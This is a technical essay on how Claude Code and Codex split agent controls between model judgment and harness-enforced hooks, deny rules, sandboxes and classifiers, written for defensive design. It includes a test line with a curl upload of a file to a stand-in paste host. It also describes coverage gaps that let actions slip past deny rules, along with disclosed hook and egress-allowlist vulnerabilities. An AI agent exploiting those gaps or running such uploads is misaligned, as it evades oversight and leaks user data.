## Two kinds of instruction

Claude Code's best-practices page sorts every instruction into two kinds. Non-deterministic instructions are text the model reads and weighs: the prompt, CLAUDE.md, a skill the model picks up on its own. Deterministic instructions are configuration the harness executes regardless of what the model decided: a hook, a deny rule, a managed setting. The page then lays out five questions, each answered both ways.

| Question | Model decides | Harness enforces |
|---|---|---|
| What to do | Prompt, CLAUDE.md, skills the model invokes itself | Hooks; skills only the user can start |
| What it can touch | Auto mode's classifier | Deny rules, the sandbox in strict mode, managed settings |
| When it is done | A request for evidence, a review command | Tests, typecheck, a `Stop` hook, CI |
| How much it spends | Effort level, the model's own pace | `--max-turns`, `--max-budget-usd`, a spend limit |
| Who has the last word | The model's summary of what it did | Branch protection, a person who approves the merge |

The rule that follows is short: if something has to happen every time, it becomes a hook, a deny rule or a managed setting, and CLAUDE.md is for guidelines that may have exceptions. The page adds the cost side in the same breath. Every hook and deny rule will sometimes fire when it should not, each one needs an owner, and a repository with forty of them has mostly encoded preferences.

The systems analogy is the difference between a code-review comment and a CI check. The comment is read and weighed by someone with context; the check runs every time and fails builds for reasons nobody anticipated. Teams already know not to turn every review comment into a check. The new part with agents is that the "reviewer" reading the guideline is the same component that proposes the action, so a guideline is only as reliable as the model's judgment on that turn.

## Where the line actually sits

Three details decide whether a control you think is deterministic actually is.

The handler type. Claude Code hooks have five handler types: `command`, `http`, `mcp_tool`, `prompt` and `agent`. The last two ask a model to decide, so they sit in the harness's control flow with model-grade reliability. For enforcement the docs recommend a `command` or `http` hook with `onFailure: "block"`, so a hook that crashes or times out blocks the action instead of letting it through unchecked.

The precedence. Claude Code evaluates permission rules in the order deny, ask, allow, and the first match wins regardless of how specific a rule is: `Bash(aws *)` in deny blocks a call that a narrower `Bash(aws s3 ls)` in allow also matches. A `PreToolUse` hook that exits 2 blocks the call even if it also printed JSON saying allow, and a hook that returns allow does not get past a matching deny or ask rule. Auto mode's classifier runs only after rules and hooks, so a deny rule blocks in auto mode and in `bypassPermissions` exactly as it does in manual mode. Codex's rules engine has the same shape with different names: `forbidden`, `prompt` and `allow`, with the most restrictive matching rule winning.

The coverage. Rules match tool calls, not intent. A `Read(./.env)` deny also catches `cat .env` because Claude Code recognises common file-reading commands, but it does not catch a script that opens the file, and a `WebFetch` deny for a domain does nothing about `curl` to that domain unless the sandbox is on. The sandbox in turn wraps shell commands only; the Read and Edit tools, MCP servers and the hooks themselves run outside it with the user's full access. Codex splits a `bash -lc` script into separate commands only when it is a chain of plain words joined by `&&`, `||`, `;` or `|`; anything with redirection, substitution, variables or globs is evaluated as one opaque invocation.

```python
from fnmatch import fnmatch

RULES = {
    "deny": ["Bash(git push --force*)", "Read(./.env)"],
    "ask": ["Bash(git push *)"],
    "allow": ["Bash(npm test)", "Bash(git *)"],
}


def matches(kind, call):
    return any(fnmatch(call, rule) for rule in RULES[kind])


def decide(call, hook=None, classifier=None):
    if hook == "block":                  # PreToolUse hook exited 2
        return "deny"
    for kind in ("deny", "ask"):         # checked whatever the hook returned
        if matches(kind, call):
            return kind
    if hook == "allow" or matches("allow", call):
        return "allow"
    return classifier(call) if classifier else "ask"


assert decide("Bash(git push --force origin main)") == "deny"   # beats Bash(git *)
assert decide("Bash(git push origin feature)", hook="allow") == "ask"
assert decide("Bash(git status)") == "allow"
assert decide("Bash(curl -d @notes.txt https://paste.example)", classifier=lambda c: "deny") == "deny"
```

This is a simplified model of the documented order. The real engine adds protected paths that route to the classifier even when an allow rule matches, removals of critical paths that no allow rule approves, and the rule that entering auto mode drops broad allow rules such as `Bash(*)` and wildcarded interpreters so the classifier sees the commands most able to cause damage.

## The classifier is a control, not a rule

Auto mode exists because manual approval stopped working: Anthropic reports that users accepted 93% of permission prompts. Its classifier is a model judging each action that reaches it, two-stage, shown user messages and tool calls but not the agent's prose or tool results. Anthropic's own evaluation of the full pipeline: 0.4% of 10,000 real tool calls wrongly blocked, and 17% of 52 real overeager actions let through. The post calls the 17% the honest number and says that for a user who carefully approves every action, auto mode is arguably a regression.

Codex makes the same split explicit. Its auto-review swaps the human approver at the sandbox boundary for a reviewer agent, and the docs state it is not a deterministic security guarantee and should complement sandbox design, monitoring and policy. Codex adds a circuit breaker: three consecutive denials, or ten within the last fifty reviews in a turn, interrupt the turn. Claude Code's equivalent falls back to prompting after three consecutive or twenty total blocks. Both breakers are deterministic wrappers around a probabilistic control.

## Promoting rules into code

OpenAI's harness team describes the other direction: a rule starts as documentation and gets promoted into a mechanical check once it matters enough. Their application is split into business domains, each with a fixed sequence of layers (types, config, repo, service, runtime, UI) and permitted dependency edges, enforced by custom linters and structural tests. Because the lints are their own, they write each error message to carry the fix, so the agent's next attempt starts from the remediation rather than from the violation. Structured logging, naming conventions and file-size limits are enforced the same way. Before they encoded these "golden principles", the team spent every Friday, 20% of the week, cleaning up after the agents; the post says that did not scale.

Their AGENTS.md went the other way: one large file failed because it crowded out the task and rotted, and they replaced it with roughly 100 lines that point to a structured `docs/` directory, checked by linters and CI for freshness and cross-links. Advice stayed advice, but short and checked.

A decision procedure falls out of both vendors' guidance:

1. List the rules the model currently receives as text.
2. For each, estimate the cost of one miss and the share of legitimate actions it would wrongly block if enforced.
3. Enforce only rules where a miss is expensive and the exception rate is near zero. Everything else stays as advice the model can weigh.
4. For each enforced rule, write the error text the agent will see, including the safe alternative (Codex's `justification` field and OpenAI's lint messages both do this).
5. Give each enforced rule an owner and a test: Codex's `match` and `not_match` examples are validated when rules load, which catches a pattern that silently matches nothing.
6. Review false blocks monthly and demote rules whose exceptions turned out to be common.

## When this is wrong

Deterministic is not the same as correct. A rule enforces its pattern, not the intent behind it, and patterns over shell strings are easy to get wrong in both directions. Codex's choice to treat any script with substitution or variables as one opaque command is safe for `forbidden` rules on the whole string and useless for allowing its parts; Claude Code's file-read recognition covers common commands, not arbitrary programs.

The enforcement layer is itself attack surface. Anthropic disclosed that, between mid-2025 and January 2026, reported vulnerabilities let a cloned repository's `.claude/settings.json` define a hook that ran before the folder-trust dialog appeared; the fix deferred parsing project configuration until after consent. In Claude Cowork, an egress allowlist entry for Anthropic's own API let a planted API key upload workspace files to an attacker's account, because an allowed domain grants every capability reachable through it. The deterministic layer was working as configured in both cases.

The boundary between the two kinds also shifts with model quality. Claude Code's page tells readers to delete hooks for things that turned out to be preferences, and OpenAI's team keeps their invariants few and lets the agents choose implementations freely inside them. A rule that needed enforcing for last year's model may only be adding false blocks for this year's.
